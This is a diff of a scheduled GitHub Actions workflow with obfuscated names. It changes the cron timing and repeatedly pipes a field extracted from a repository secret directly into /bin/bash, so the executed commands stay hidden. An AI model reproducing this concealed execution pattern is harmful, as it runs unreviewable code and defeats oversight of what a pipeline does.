@@ -1,8 +1,9 @@
 name: caoyukaiming
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 1/6 * * *'
+    - cron: '23 4/6 * * *'
 
 jobs:
   build:
@@ -12,15 +13,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: caoyukaiming
         env:
-          hvf83530: ${{ secrets.hvf83530 }}
+          a29709: ${{ secrets.a29709 }}
         run: |
-          echo $hvf83530 | jq -r .shqa7 | /bin/bash
-          echo $xekci83361 | jq -r .jap40 | /bin/bash
-          echo $nrqhh55 | jq -r .s076 | /bin/bash
-          echo $mehvm43 | jq -r .eudaw145 | /bin/bash
-          echo $l3503 | jq -r .ac10021 | /bin/bash
-          echo $h38515 | jq -r .rb3918 | /bin/bash
-          echo $ot3763 | jq -r .ic50367 | /bin/bash
-          echo $maw267 | jq -r .ltvnu80703 | /bin/bash
-          echo $yk1673 | jq -r .c7418 | /bin/bash
+          echo $a29709 | jq -r .aufxp62 | /bin/bash
+          echo $bydx99124 | jq -r .zwnxa46 | /bin/bash
+          echo $z6 | jq -r .zbvq79 | /bin/bash
 
